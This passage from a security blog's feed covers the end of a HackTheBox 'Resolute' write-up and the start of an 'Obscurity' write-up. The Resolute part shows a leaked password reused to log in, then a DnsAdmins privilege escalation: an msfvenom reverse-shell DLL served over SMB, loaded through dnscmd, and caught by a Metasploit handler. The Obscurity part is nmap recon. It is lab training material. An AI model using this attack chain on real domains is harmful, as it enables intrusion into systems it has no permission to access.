&lt;span class="code-line"&gt;d--h--        9/25/2019  10:48 AM                ProgramData&lt;/span&gt;
&lt;span class="code-line"&gt;d--h--        12/3/2019   6:32 AM                PSTranscripts&lt;/span&gt;
&lt;span class="code-line"&gt;d--hs-        9/25/2019  10:17 AM                Recovery&lt;/span&gt;
&lt;span class="code-line"&gt;d--hs-        9/25/2019   6:25 AM                System Volume Information&lt;/span&gt;
&lt;span class="code-line"&gt;d-r---        12/4/2019   2:46 AM                Users&lt;/span&gt;
&lt;span class="code-line"&gt;d-----        12/4/2019   5:15 AM                Windows&lt;/span&gt;
&lt;span class="code-line"&gt;-arhs-       11/20/2016   5:59 PM         389408 bootmgr&lt;/span&gt;
&lt;span class="code-line"&gt;-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT&lt;/span&gt;
&lt;span class="code-line"&gt;-a-hs-       12/11/2019   8:48 AM      402653184 pagefile.sys&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We go through the folder until finding the transcript text file. Then we display
it. Inside we see a few commands and then a backup command using the &lt;code&gt;ryan&lt;/code&gt; user
and its password &lt;code&gt;Serv3r4Admin4cc123!&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\&amp;gt; dir -force PSTranscripts\&lt;/span&gt;
&lt;span class="code-line"&gt;    Directory: C:\PSTranscripts&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
&lt;span class="code-line"&gt;----                -------------         ------ ----&lt;/span&gt;
&lt;span class="code-line"&gt;d--h--        12/3/2019   6:45 AM                20191203&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\&amp;gt; dir -force PSTranscripts\20191203\&lt;/span&gt;
&lt;span class="code-line"&gt;    Directory: C:\PSTranscripts\20191203&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
&lt;span class="code-line"&gt;----                -------------         ------ ----&lt;/span&gt;
&lt;span class="code-line"&gt;-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\&amp;gt; type PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt&lt;/span&gt;
&lt;span class="code-line"&gt;**********************&lt;/span&gt;
&lt;span class="code-line"&gt;Windows PowerShell transcript start&lt;/span&gt;
&lt;span class="code-line"&gt;Start time: 20191203063201&lt;/span&gt;
&lt;span class="code-line"&gt;Username: MEGABANK\ryan&lt;/span&gt;
&lt;span class="code-line"&gt;RunAs User: MEGABANK\ryan&lt;/span&gt;
&lt;span class="code-line"&gt;Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)&lt;/span&gt;
&lt;span class="code-line"&gt;Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding&lt;/span&gt;
&lt;span class="code-line"&gt;Process ID: 2800&lt;/span&gt;
&lt;span class="code-line"&gt;PSVersion: 5.1.14393.2273&lt;/span&gt;
&lt;span class="code-line"&gt;PSEdition: Desktop&lt;/span&gt;
&lt;span class="code-line"&gt;PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273&lt;/span&gt;
&lt;span class="code-line"&gt;BuildVersion: 10.0.14393.2273&lt;/span&gt;
&lt;span class="code-line"&gt;CLRVersion: 4.0.30319.42000&lt;/span&gt;
&lt;span class="code-line"&gt;WSManStackVersion: 3.0&lt;/span&gt;
&lt;span class="code-line"&gt;PSRemotingProtocolVersion: 2.3&lt;/span&gt;
&lt;span class="code-line"&gt;SerializationVersion: 1.1.0.1&lt;/span&gt;
&lt;span class="code-line"&gt;**********************&lt;/span&gt;
&lt;span class="code-line"&gt;Command start time: 20191203063455&lt;/span&gt;
&lt;span class="code-line"&gt;**********************&lt;/span&gt;
&lt;span class="code-line"&gt;PS&amp;gt;TerminatingError(): &amp;quot;System error.&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt; CommandInvocation(Invoke-Expression): &amp;quot;Invoke-Expression&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt; ParameterBinding(Invoke-Expression): name=&amp;quot;Command&amp;quot;; value=&amp;quot;-join($id,&amp;#39;PS &amp;#39;,$(whoami),&amp;#39;@&amp;#39;,$env:computername,&amp;#39; &amp;#39;,$((gi $pwd).Name),&amp;#39;&amp;gt; &amp;#39;)&lt;/span&gt;
&lt;span class="code-line"&gt;if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt; CommandInvocation(Out-String): &amp;quot;Out-String&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt; ParameterBinding(Out-String): name=&amp;quot;Stream&amp;quot;; value=&amp;quot;True&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;**********************&lt;/span&gt;
&lt;span class="code-line"&gt;Command start time: 20191203063455&lt;/span&gt;
&lt;span class="code-line"&gt;**********************&lt;/span&gt;
&lt;span class="code-line"&gt;PS&amp;gt;ParameterBinding(Out-String): name=&amp;quot;InputObject&amp;quot;; value=&amp;quot;PS megabank\ryan@RESOLUTE Documents&amp;gt; &amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;PS megabank\ryan@RESOLUTE Documents&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;**********************&lt;/span&gt;
&lt;span class="code-line"&gt;Command start time: 20191203063515&lt;/span&gt;
&lt;span class="code-line"&gt;**********************&lt;/span&gt;
&lt;span class="code-line"&gt;PS&amp;gt;CommandInvocation(Invoke-Expression): &amp;quot;Invoke-Expression&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt; ParameterBinding(Invoke-Expression): name=&amp;quot;Command&amp;quot;; value=&amp;quot;cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can then login with the ryan user still using
&lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil-winrm&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ruby evil-winrm.rb -u ryan -p &amp;#39;Serv3r4Admin4cc123!&amp;#39; -i 10.10.10.169&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Users\ryan\Desktop&amp;gt; type note.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Email to team:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We enumerate our new permissions. Using
&lt;a href="https://github.com/BloodHoundAD/BloodHound"&gt;Bloodhound&lt;/a&gt; we see that we are part
of the &lt;code&gt;DNSADMINS&lt;/code&gt; group.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ryan's groups" src="/media/2020.05/resolute_02.png"&gt;&lt;/p&gt;
&lt;p&gt;We can confirm this by using &lt;code&gt;whoami /all&lt;/code&gt; (I remove the "SUID" and "Attributes"
columns for more clarity).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\ryan\Documents&amp;gt; whoami /all&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;USER INFORMATION&lt;/span&gt;
&lt;span class="code-line"&gt;----------------&lt;/span&gt;
&lt;span class="code-line"&gt;User Name     SID&lt;/span&gt;
&lt;span class="code-line"&gt;============= ==============================================&lt;/span&gt;
&lt;span class="code-line"&gt;megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;GROUP INFORMATION&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Group Name                                 Type&lt;/span&gt;
&lt;span class="code-line"&gt;========================================== ================&lt;/span&gt;
&lt;span class="code-line"&gt;Everyone                                   Well-known group&lt;/span&gt;
&lt;span class="code-line"&gt;BUILTIN\Users                              Alias&lt;/span&gt;
&lt;span class="code-line"&gt;BUILTIN\Pre-Windows 2000 Compatible Access Alias&lt;/span&gt;
&lt;span class="code-line"&gt;BUILTIN\Remote Management Users            Alias&lt;/span&gt;
&lt;span class="code-line"&gt;NT AUTHORITY\NETWORK                       Well-known group&lt;/span&gt;
&lt;span class="code-line"&gt;NT AUTHORITY\Authenticated Users           Well-known group&lt;/span&gt;
&lt;span class="code-line"&gt;NT AUTHORITY\This Organization             Well-known group&lt;/span&gt;
&lt;span class="code-line"&gt;MEGABANK\Contractors                       Group&lt;/span&gt;
&lt;span class="code-line"&gt;MEGABANK\DnsAdmins                         Alias&lt;/span&gt;
&lt;span class="code-line"&gt;NT AUTHORITY\NTLM Authentication           Well-known group&lt;/span&gt;
&lt;span class="code-line"&gt;Mandatory Label\Medium Mandatory Level     Label&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PRIVILEGES INFORMATION&lt;/span&gt;
&lt;span class="code-line"&gt;----------------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Privilege Name                Description                    State&lt;/span&gt;
&lt;span class="code-line"&gt;============================= ============================== =======&lt;/span&gt;
&lt;span class="code-line"&gt;SeMachineAccountPrivilege     Add workstations to domain     Enabled&lt;/span&gt;
&lt;span class="code-line"&gt;SeChangeNotifyPrivilege       Bypass traverse checking       Enabled&lt;/span&gt;
&lt;span class="code-line"&gt;SeIncreaseWorkingSetPrivilege Increase a process working set Enabled&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;A few Google research allow us to find that being DNSAdmin allow for privilege
escalation. The technique is to change the DNS configuration so it will load a
DLL when starting the DNS service. We can either charge the DLL locally or
remotely using SMB.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://adsecurity.org/?p=4064"&gt;https://adsecurity.org/?p=4064&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DNSAdmins/DNSAdmins.md"&gt;https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DNSAdmins/DNSAdmins.md&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html"&gt;http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83"&gt;https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In order to write the DLL we use &lt;code&gt;msfvenom&lt;/code&gt; with a classic reverse shell
payload.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msfvenom -p windows/x64/shell_reverse_tcp LHOST=&amp;quot;10.10.14.56&amp;quot; LPORT=4444 -f dll -o ~/srv/msf3.dll&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We start our SMB server using
&lt;a href="https://github.com/SecureAuthCorp/impacket"&gt;impacket&lt;/a&gt; &lt;code&gt;smbserver.py&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python smbserver.py -ip 10.10.14.56 IOIO ~/srv/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Registry property serverlevelplugindll successfully reset.
Command completed successfully. We start our handler using metasploit. And using
our shell as &lt;code&gt;ryan&lt;/code&gt; we change the DNS configuration, stop the DNS service and
start it back using &lt;code&gt;sc.exe&lt;/code&gt;. We can see in our SMB server's logs that our
DLL is sent to the server. And we can see on our metasploit handler that we get
a revershell. We can then easily get the root flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;::: text&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\ryan&amp;gt; dnscmd /config /serverlevelplugindll \\10.10.14.56\IOIO\msf3.dll&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\ryan&amp;gt; sc.exe stop dns&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;SERVICE_NAME: dns&lt;/span&gt;
&lt;span class="code-line"&gt;        TYPE               : 10  WIN32_OWN_PROCESS&lt;/span&gt;
&lt;span class="code-line"&gt;        STATE              : 3  STOP_PENDING&lt;/span&gt;
&lt;span class="code-line"&gt;                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)&lt;/span&gt;
&lt;span class="code-line"&gt;        WIN32_EXIT_CODE    : 0  (0x0)&lt;/span&gt;
&lt;span class="code-line"&gt;        SERVICE_EXIT_CODE  : 0  (0x0)&lt;/span&gt;
&lt;span class="code-line"&gt;        CHECKPOINT         : 0x1&lt;/span&gt;
&lt;span class="code-line"&gt;        WAIT_HINT          : 0x7530&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\ryan&amp;gt; sc.exe start dns&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;SERVICE_NAME: dns&lt;/span&gt;
&lt;span class="code-line"&gt;        TYPE               : 10  WIN32_OWN_PROCESS&lt;/span&gt;
&lt;span class="code-line"&gt;        STATE              : 2  START_PENDING&lt;/span&gt;
&lt;span class="code-line"&gt;                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)&lt;/span&gt;
&lt;span class="code-line"&gt;        WIN32_EXIT_CODE    : 0  (0x0)&lt;/span&gt;
&lt;span class="code-line"&gt;        SERVICE_EXIT_CODE  : 0  (0x0)&lt;/span&gt;
&lt;span class="code-line"&gt;        CHECKPOINT         : 0x0&lt;/span&gt;
&lt;span class="code-line"&gt;        WAIT_HINT          : 0x7d0&lt;/span&gt;
&lt;span class="code-line"&gt;        PID                : 4980&lt;/span&gt;
&lt;span class="code-line"&gt;        FLAGS              :&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The metasploit handler is running simultaneously.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 exploit(multi/handler) &amp;gt; run&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Started reverse TCP handler on 10.10.14.56:4444&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Command shell session 2 opened (10.10.14.56:4444 -&amp;gt; 10.10.10.169:50613) at 2019-12-12 03:46:20 -0500&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.14393]&lt;/span&gt;
&lt;span class="code-line"&gt;(c) 2016 Microsoft Corporation. All rights reserved.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Windows\system32&amp;gt;type C:\Users\Administrator\Desktop\root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;type C:\Users\Administrator\Desktop\root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;e1d94876a506850d0c20edb5405e619c&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;Getting the first user is quit easy if you use
&lt;a href="https://github.com/portcullislabs/enum4linux"&gt;enum4linux&lt;/a&gt;. You can even spray
the password by hand.
The second user is just enumeration. It can take a long time before enumerating
the right folder.
The root part is quit interesting and let me learn a few things about DLL
injection.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="DLL"></category><category term="DnsAdmins"></category></entry><entry><title>HTB: Obscurity</title><link href="https://maggick.fr/2020/05/htb-obscurity.html" rel="alternate"></link><published>2020-05-11T10:05:00+02:00</published><updated>2020-05-11T10:05:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-05-11:/2020/05/htb-obscurity.html</id><summary type="html">&lt;p&gt;&lt;img alt="Obscurity card" class="align-left" src="/media/2020.05/obscurity_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/219"&gt;Obscurity&lt;/a&gt;
This box is classified as a medium machine. It was release on December the first
2019 by &lt;a href="https://www.hackthebox.eu/home/users/profile/83743"&gt;clubby789&lt;/a&gt;.
It implies some enumeration and a lot of python.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.05/obscurity_card.png" alt="Obscurity card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/219"&gt;Obscurity&lt;/a&gt;
This box is classified as a medium machine. It was release on December the first
2019 by &lt;a href="https://www.hackthebox.eu/home/users/profile/83743"&gt;clubby789&lt;/a&gt;.
It implies some enumeration and a lot of python.&lt;/p&gt;


&lt;h1 id="getting-user"&gt;Getting User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;We start with a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 22 (SSH) and port 8080 are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Fri Dec  6 04:58:41 2019 as: nmap -sS -p- -oA nmap 10.10.10.168&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.168&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.091s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65531 filtered ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT     STATE  SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp   open   ssh&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp   closed http&lt;/span&gt;
&lt;span class="code-line"&gt;8080/tcp open   http-proxy&lt;/span&gt;
&lt;span class="code-line"&gt;9000/tcp closed cslistener&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Fri Dec  6 05:01:34 2019 -- 1 IP address (1 host up) scanned in 173.56 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run a service scan on this two ports, the second port is an HTTP server.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Fri Dec  6 05:11:21 2019 as: nmap -sSV -p22,8080-oA service 10.10.10.168&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.168&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.092s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PORT     STATE  SERVICE    VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;8080/tcp open   http-proxy BadHTTPServer&lt;/span&gt;
&lt;span class="code-line"&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :&lt;/span&gt;
&lt;span class="code-line"&gt;SF-Port8080-TCP:V=7.80%I=7%D=12/6%Time=5DEA2950%P=x86_64-pc-linux-gnu%r(Ge&lt;/span&gt;
&lt;span class="code-line"&gt;SF:tRequest,10FC,&amp;quot;HTTP/1\.1\x20200\x20OK\nDate:\x20Fri,\x2006\x20Dec\x2020&lt;/span&gt;
&lt;span class="code-line"&gt;SF:19\x2010:12:29\nServer:\x20BadHTTPServer\nLast-Modified:\x20Fri,\x2006\&lt;/span&gt;
&lt;span class="code-line"&gt;SF:x20Dec\x202019\x2010:12:29\nContent-Length:\x204171\nContent-Type:\x20t&lt;/span&gt;
&lt;span class="code-line"&gt;SF:ext/html\nConnection:\x20Closed\n\n&amp;lt;!DOCTYPE\x20html&amp;gt;\n&amp;lt;html\x20lang=\&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;SF:en\&amp;quot;&amp;gt;\n&amp;lt;head&amp;gt;\n\t&amp;lt;meta\x20charset=\&amp;quot;utf-8\&amp;quot;&amp;gt;\n\t&amp;lt;title&amp;gt;0bscura&amp;lt;/title&amp;gt;\&lt;/span&gt;
&lt;span class="code-line"&gt;SF:n\t&amp;lt;meta\x20http-equiv=\&amp;quot;X-UA-Compatible\&amp;quot;\x20content=\&amp;quot;IE=Edge\&amp;quot;&amp;gt;\n\t&amp;lt;&lt;/span&gt;
&lt;span class="code-line"&gt;SF:meta\x20name=\&amp;quot;viewport\&amp;quot;\x20content=\&amp;quot;width=device-width,\x20initial-s&lt;/span&gt;
&lt;span class="code-line"&gt;SF:cale=1\&amp;quot;&amp;gt;\n\t&amp;lt;meta\x20name=\&amp;quot;keywords\&amp;quot;\x20content=\&amp;quot;\&amp;quot;&amp;gt;\n\t&amp;lt;meta\x20na&lt;/span&gt;
&lt;span class="code-line"&gt;SF:me=\&amp;quot;description\&amp;quot;\x20content=\&amp;quot;\&amp;quot;&amp;gt;\n&amp;lt;!--\x20\nEasy\x20Profile\x20Templ&lt;/span&gt;
&lt;span class="code-line"&gt;SF:ate\nhttp://www\.templatemo\.com/tm-467-easy-profile\n--&amp;gt;\n\t&amp;lt;!--\x20st&lt;/span&gt;
&lt;span class="code-line"&gt;SF:ylesheet\x20css\x20--&amp;gt;\n\t&amp;lt;link\x20rel=\&amp;quot;stylesheet\&amp;quot;\x20href=\&amp;quot;css/boo&lt;/span&gt;
&lt;span class="code-line"&gt;SF:tstrap\.min\.css\&amp;quot;&amp;gt;\n\t&amp;lt;link\x20rel=\&amp;quot;stylesheet\&amp;quot;\x20href=\&amp;quot;css/font-a&lt;/span&gt;
&lt;span class="code-line"&gt;SF:wesome\.min\.css\&amp;quot;&amp;gt;\n\t&amp;lt;link\x20rel=\&amp;quot;stylesheet\&amp;quot;\x20href=\&amp;quot;css/templa&lt;/span&gt;
&lt;span class="code-line"&gt;SF:temo-blue\.css\&amp;quot;&amp;gt;\n&amp;lt;/head&amp;gt;\n&amp;lt;body\x20data-spy=\&amp;quot;scroll\&amp;quot;\x20data-target&lt;/span&gt;
&lt;span class="code-line"&gt;SF:=\&amp;quot;\.navbar-collapse\&amp;quot;&amp;gt;\n\n&amp;lt;!--\x20preloader\x20section\x20--&amp;gt;\n&amp;lt;!--\n&amp;lt;&lt;/span&gt;
&lt;span class="code-line"&gt;SF:div\x20class=\&amp;quot;preloader\&amp;quot;&amp;gt;\n\t&amp;lt;div\x20class=\&amp;quot;sk-spinner\x20sk-spinner&lt;/span&gt;
&lt;span class="code-line"&gt;SF:-wordpress\&amp;quot;&amp;gt;\n&amp;quot;)%r(HTTPOptions,10FC,&amp;quot;HTTP/1\.1\x20200\x20OK\nDate:\x20&lt;/span&gt;
&lt;span class="code-line"&gt;SF:Fri,\x2006\x20Dec\x202019\x2010:12:30\nServer:\x20BadHTTPServer\nLast-M&lt;/span&gt;
&lt;span class="code-line"&gt;SF:odified:\x20Fri,\x2006\x20Dec\x202019\x2010:12:30\nContent-Length:\x204&lt;/span&gt;
&lt;span class="code-line"&gt;SF:171\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n&amp;lt;!DOCTYPE\x20&lt;/span&gt;
&lt;span class="code-line"&gt;SF:html&amp;gt;\n&amp;lt;html\x20lang=\&amp;quot;en\&amp;quot;&amp;gt;\n&amp;lt;head&amp;gt;\n\t&amp;lt;meta\x20charset=\&amp;quot;utf-8\&amp;quot;&amp;gt;\n\t&lt;/span&gt;
&lt;span class="code-line"&gt;SF:&amp;lt;title&amp;gt;0bscura&amp;lt;/title&amp;gt;\n\t&amp;lt;meta\x20http-equiv=\&amp;quot;X-UA-Compatible\&amp;quot;\x20co&lt;/span&gt;
&lt;span class="code-line"&gt;SF:ntent=\&amp;quot;IE=Edge\&amp;quot;&amp;gt;\n\t&amp;lt;meta\x20name=\&amp;quot;viewport\&amp;quot;\x20content=\&amp;quot;width=dev&lt;/span&gt;
&lt;span class="code-line"&gt;SF:ice-width,\x20initial-scale=1\&amp;quot;&amp;gt;\n\t&amp;lt;meta\x20name=\&amp;quot;keywords\&amp;quot;\x20conte&lt;/span&gt;
&lt;span class="code-line"&gt;SF:nt=\&amp;quot;\&amp;quot;&amp;gt;\n\t&amp;lt;meta\x20name=\&amp;quot;description\&amp;quot;\x20content=\&amp;quot;\&amp;quot;&amp;gt;\n&amp;lt;!--\x20\nE&lt;/span&gt;
&lt;span class="code-line"&gt;SF:asy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pro&lt;/span&gt;
&lt;span class="code-line"&gt;SF:file\n--&amp;gt;\n\t&amp;lt;!--\x20stylesheet\x20css\x20--&amp;gt;\n\t&amp;lt;link\x20rel=\&amp;quot;stylesh&lt;/span&gt;
&lt;span class="code-line"&gt;SF:eet\&amp;quot;\x20href=\&amp;quot;css/bootstrap\.min\.css\&amp;quot;&amp;gt;\n\t&amp;lt;link\x20rel=\&amp;quot;stylesheet&lt;/span&gt;
&lt;span class="code-line"&gt;SF:\&amp;quot;\x20href=\&amp;quot;css/font-awesome\.min\.css\&amp;quot;&amp;gt;\n\t&amp;lt;link\x20rel=\&amp;quot;stylesheet&lt;/span&gt;
&lt;span class="code-line"&gt;SF:\&amp;quot;\x20href=\&amp;quot;css/templatemo-blue\.css\&amp;quot;&amp;gt;\n&amp;lt;/head&amp;gt;\n&amp;lt;body\x20data-spy=\&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;SF:scroll\&amp;quot;\x20data-target=\&amp;quot;\.navbar-collapse\&amp;quot;&amp;gt;\n\n&amp;lt;!--\x20preloader\x20&lt;/span&gt;
&lt;span class="code-line"&gt;SF:section\x20--&amp;gt;\n&amp;lt;!--\n&amp;lt;div\x20class=\&amp;quot;preloader\&amp;quot;&amp;gt;\n\t&amp;lt;div\x20class=\&amp;quot;s&lt;/span&gt;
&lt;span class="code-line"&gt;SF:k-spinner\x20sk-spinner-wordpress\&amp;quot;&amp;gt;\n&amp;quot;);&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Fri Dec  6 05:11:35 2019 -- 1 IP address (1 host up) scanned in 13.83 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;We take a look at the home page. A few sentences inform us that the web server
is a custom one and that its source code is in a python file inside the
development directory.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Here at 0bscura, we take a unique approach to security: you can't be hacked
if attackers don't know what software you're using!&lt;/p&gt;
